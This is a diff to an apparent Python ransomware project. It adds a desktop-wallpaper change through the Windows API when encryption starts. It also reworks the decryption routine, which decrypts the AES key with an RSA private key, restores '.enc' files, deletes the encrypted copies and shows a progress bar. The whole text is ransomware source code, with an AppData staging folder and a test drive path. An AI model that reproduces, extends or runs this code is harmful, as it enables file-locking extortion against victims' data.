@@ -6,12 +6,13 @@ import hashlib
 import datetime
 import fnmatch
 import base64
+import ctypes
 from Crypto.Cipher import AES, PKCS1_OAEP
 from Crypto.Util.Padding import pad, unpad
 from Crypto.Random import get_random_bytes
 from Crypto.PublicKey import RSA
 from ransomware.mysocket import MySocket
-import tkinter as tk
+from tkinter import ttk
 
 __rmfolderPath = f"C:/Users/{os.getlogin()}/AppData/Local/bkms/"
 testPath = "./data/"
@@ -112,6 +113,8 @@ class CreateFile:
 
 def runEncryption():
     print("Encryption start")
+    img = os.path.abspath("./images/")
+    ctypes.windll.user32.SystemParametersInfoW(20, 0, img, 3)
     cf = CreateFile(testPath)
     cf.checkfile("lock.json")
     drives = ["E:\\test"]  # For testing purpose
@@ -163,7 +166,7 @@ def runEncryption():
 
 def runDecryption(tk_root, privateKey):
     print("Decryption start")
-    # 更新锁定文件的状态为已支付
+    #print(f"Using private key: {privateKey[:30]}...")
     rmfilePath = os.path.join(testPath, "lock.json")
     with open(rmfilePath, "r", encoding="utf-8") as file:
         data = json.load(file)
@@ -171,35 +174,39 @@ def runDecryption(tk_root, privateKey):
     with open(rmfilePath, "w", encoding="utf-8") as file:
         json.dump(data, file, indent=4)
 
-    # 加载密钥文件
     rmfilePath = os.path.join(testPath, "key.json")
     with open(rmfilePath, "r", encoding="utf-8") as file:
         enkey = json.load(file)
     
-    # 使用私钥解密AES密钥
-    aes_key = rsaDecrypt(enkey["key"], privateKey)
+    aes_key = base64.b64decode(enkey["key"])
+    aes_key = rsaDecrypt(aes_key,privateKey)
 
-    # 加载要解密的文件路径列表
     rmfilePath = os.path.join(testPath, "filepath.txt")
     filepath = []
     with open(rmfilePath, "r", encoding="utf-8") as file:
         for line in file:
             filepath.append(line.strip())
-    print(len(filepath))
+    #print(len(filepath))
 
-    # 逐个解密文件
-    for file_path in filepath:
+    progress = ttk.Progressbar(tk_root, orient="horizontal", length=300, mode="determinate")
+    progress.pack(pady=20)
+    progress["maximum"] = len(filepath)
+
+    for i, file_path in enumerate(filepath):
         try:
             with open(file_path, "rb") as encrypted_file:
                 encrypted_data = encrypted_file.read()
             
-            # 解密文件内容
             decrypted_data = aesDecrypt(aes_key, encrypted_data)
             
-            # 写入解密后的内容到新文件
-            new_file_path = file_path[:-4]  # 移除文件扩展名 .enc
+            new_file_path = file_path[:-4]
             with open(new_file_path, "wb") as decrypted_file:
                 decrypted_file.write(decrypted_data)
+            os.remove(file_path)
             print(f"Decrypted {file_path} successfully.")
         except Exception as e:
             print(f"Error decrypting file {file_path}: {e}")
+
+        progress["value"] = i + 1
+        tk_root.update_idletasks()
+    tk_root.destroy()
